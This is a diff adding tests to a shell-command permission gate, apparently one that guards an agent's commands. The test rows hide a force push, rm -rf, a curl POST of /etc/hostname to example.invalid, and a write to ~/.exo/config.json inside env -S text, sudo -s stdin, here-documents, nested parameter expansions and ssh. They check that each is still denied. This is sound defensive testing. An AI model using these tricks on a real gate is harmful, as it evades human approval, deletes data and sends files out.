@@ -1293,3 +1293,110 @@ def test_a_fuzzed_line_is_parsed_a_bounded_number_of_times():
     four = "\n".join([_FUZZ_LINE] * 4)
     assert _parses(_FUZZ_LINE) - _parses_before(_FUZZ_LINE) == _parses(four) - _parses_before(four)
     assert _parses(four) <= _parses(_FUZZ_LINE) + 1
+
+
+# Merge of main f28934a3 (review 5678114763): main reads each `env -S` text again in `split_readings` (#591, #707)
+# and the stdin of a `sudo -s` or `sudo -i` shell, with the line as read before #491 at the end of its floors (#491,
+# #718). Each `env -S` reading is read both ways here (_classify_reading), so a ${..} word, a backquote, a `<( )`,
+# a quote paired in a word, a `$((` bash runs as a subshell and a here-document in a word are read in those texts
+# too. Each row is (line, policy, outcome): main f28934a3 decides each lower (it reads none of the word, and the
+# isolated head before the merge reads no sudo shell's stdin), and the outcome here is the deny the command alone
+# gets. The lines are data for classify and decide; none is run.
+_CAT_LIST = {"gates": {"deny": ["force_push", "delete", "web_post"]}}
+_POST_DENY = {"gates": {"categories": {"web_post": "deny"}}}
+POST = "curl -X POST https://example.invalid/x -d @/etc/hostname"
+_COMPOSE = [
+    # env -S text: a word bash reads in the line env runs and in main's readings of the text as a shell line
+    (f"env -S 'echo ${{v:-$({PUSH})}}'", _FORCE_DENY, "deny"),
+    (f"env -S 'echo ${{v:-$({PUSH})}}'", _FORCE_LIST, "deny"),
+    (f"env --split='echo ${{v:-$({PUSH})}}'", _FORCE_DENY, "deny"),
+    (f"env -iS'echo ${{v:-`{PUSH}`}}'", _FORCE_DENY, "deny"),
+    ("env -S 'cat ${v:-<(rm -rf ./work)}'", _DELETE_DENY, "deny"),
+    (f"env -S ': ${{v:=$({POST})}}'", _POST_DENY, "deny"),
+    (f"env -S 'echo ${{a:-${{b:-$({PUSH})}}}}'", _CAT_LIST, "deny"),
+    (f"env -S \"echo \\${{x:-'}}'}} ; {PUSH}\"", _FORCE_DENY, "deny"),     # a quote paired in the word
+    (f"env -S 'sh -c \"echo \\${{v:-\\$({PUSH})}}\"'", _FORCE_DENY, "deny"),  # a shell env runs reads the word
+    (f"ssh host 'env -S \"echo \\${{v:-\\$({PUSH})}}\"'", _FORCE_DENY, "deny"),  # behind an ssh hop
+    (f"env -S 'cat $\\\n{{v:-<({PUSH})}}'", _FORCE_DENY, "deny"),       # #584: a ${ split by a backslash-newline
+    # sudo -s or -i stdin: the shell runs each line it reads, words and all
+    (f"sudo -i <<< 'echo ${{v:-$({PUSH})}}'", _FORCE_DENY, "deny"),
+    (f"sudo -s <<< \"echo \\${{v:-\\`{PUSH}\\`}}\"", _FORCE_LIST, "deny"),
+    ("printf '%s\\n' 'cat ${v:-<(rm -rf ./work)}' | sudo -s", _DELETE_LIST, "deny"),
+    (f"sudo -s <<'END'\necho ${{x:-'}}'}} ; {PUSH}\nEND", _FORCE_DENY, "deny"),
+    (f"sudo -i <<'END'\nenv -S 'true' ; echo ${{x:-$(cat <<EOF\nhi\nEOF\n{PUSH})}}\nEND", _FORCE_DENY, "deny"),
+    (f"sudo -s <<'END'\nenv -S 'echo ${{v:-$({PUSH})}}'\nEND", _FORCE_DENY, "deny"),   # env -S in sudo's stdin
+    (f"sudo -i <<'END'\necho ${{v//x/$({POST})}}\nEND", _POST_DENY, "deny"),
+]
+_COMPOSE_IDS = ["env-s-cmdsub-cat", "env-s-cmdsub-list", "env-split-cmdsub", "env-is-backquote", "env-s-procsub",
+                "env-s-assign-post", "env-s-nested-word", "env-s-quote-paired", "env-s-sh-c", "ssh-env-s",
+                "env-s-joined", "sudo-i-herestring", "sudo-s-backquote", "pipe-sudo-s-procsub",
+                "sudo-s-quote-paired", "sudo-i-heredoc-in-word", "sudo-s-env-s", "sudo-i-replace-post"]
+
+
+@pytest.mark.parametrize("line, policy, out", _COMPOSE, ids=_COMPOSE_IDS)
+def test_a_word_in_an_env_s_text_or_a_sudo_shells_stdin_is_read(line, policy, out):
+    """Each row fails on main f28934a3 (ask or allow there). The deny holds, the approval binds to the exact text,
+    and the line asks at least under every policy here."""
+    c = _c(line)
+    assert _out(line, policy) == out
+    assert gate.binds_exact(c)
+    for p in (None, _FORCE_DENY, _FORCE_LIST, _DELETE_DENY, _DELETE_LIST, _POST_DENY, _STORE_DENY):
+        assert gate.OUTCOMES.index(_out(line, p)) >= gate.OUTCOMES.index("ask"), p
+
+
+@pytest.mark.parametrize("line, policy, out", [
+    # guards: main f28934a3 already decides these so (its #553 `$((` reading, its #591 and #491 readings, and the
+    # value forms that ask), and the isolated head before the merge decided some lower (it read no sudo stdin)
+    (f"env --split='echo $((echo \"((\" ; {PUSH}) )'", _FORCE_DENY, "deny"),
+    (f"sudo -s <<'END'\necho $((echo '((' ; {PUSH}) )\nEND", _FORCE_DENY, "deny"),
+    (f"printf '%s\\n' 'echo $((echo \"((\" ; {PUSH}) )' | sudo -s", _FORCE_LIST, "deny"),
+    ("env -S 'echo ${!v}'", None, "ask"),
+    ("env --split='echo ${v@P}'", None, "ask"),
+    ("sudo -s <<< 'echo ${!v}'", None, "ask"),
+    (f"sudo -i <<'END'\nset -- '$({PUSH})'; echo ${{@@P}}\nEND", None, "ask"),
+    (f"env -S 'sudo -s' <<< 'echo ${{v:-$({PUSH})}}'", _FORCE_DENY, "ask"),   # main's #491 limit: not read, asks
+])
+def test_a_word_in_an_env_s_text_or_a_sudo_shells_stdin_keeps_mains_decision(line, policy, out):
+    assert _out(line, policy) == out
+    assert gate.binds_exact(_c(line))
+
+
+def test_each_env_s_reading_is_read_both_ways():
+    """The composition itself: main's `split_readings` (a reading of the call per `env -S` reading) each end their
+    `also` chain with the reading before #143, as the call's first reading does, and readings() lists them all, so
+    decide, binds_exact, no_grant and call_approvers read each."""
+    c = _c(f"env -S 'echo ${{v:-$({PUSH})}}'")
+    assert c.split_readings, "main reads the env -S text again"
+    for r in (c, *c.split_readings):
+        chain = [r]
+        while chain[-1].also is not None:
+            chain.append(chain[-1].also)
+        assert len(chain) >= 2 and chain[0].category == "force_push", [x.category for x in chain]
+        assert all(any(x is y for y in readings(c)) for x in chain)
+
+
+def test_a_sudo_shells_reading_as_before_491_is_read_both_ways():
+    """Main's floor for a sudo -s stdin (the line as read before #491) is read inside each of the two readings, so
+    the push in the word decides through bash's reading and main's floor stays listed."""
+    line = f"sudo -s <<< 'echo ${{v:-$({PUSH})}}'"
+    c = _c(line)
+    assert c.category == "force_push" and c.also is not None and c.floor is not None
+    assert {"force_push", "read"} <= {r.category for r in readings(c)}
+    assert _out(line, _FORCE_DENY) == "deny"
+
+
+@pytest.mark.parametrize("line", [
+    "env -S 'echo ${v:-$(cp /var/tmp/x ~/.exo/config.json)}'",
+    "env -S \"echo \\${x:-'}'} ; cp /var/tmp/x ~/.exo/config.json\"",
+    "sudo -i <<< ': ${v:=$(cp /var/tmp/x ~/.exo/config.json)}'",
+    "sudo -s <<'END'\nenv -S 'cat ${v:-<(cp /var/tmp/x ~/.exo/config.json)}'\nEND",
+])
+def test_a_store_write_in_a_word_in_an_env_s_text_or_sudo_stdin_keeps_the_floor(line):
+    """The config-store reading (D-074) of a word in an `env -S` text or a sudo shell's stdin: the write is a
+    store write, no grant covers it (no_grant), only the principal answers, and a deny on store writes holds. Main
+    f28934a3 reads none of the word: it asks with no_grant False."""
+    c = _c(line)
+    assert "store_write" in _categories(line)
+    assert gate.no_grant(c) and gate.binds_exact(c)
+    assert gate.call_approvers(c, {"default": ["principal", "seat:ops"], "categories": {}}) == ["principal"]
+    assert _out(line, _STORE_DENY) == "deny"
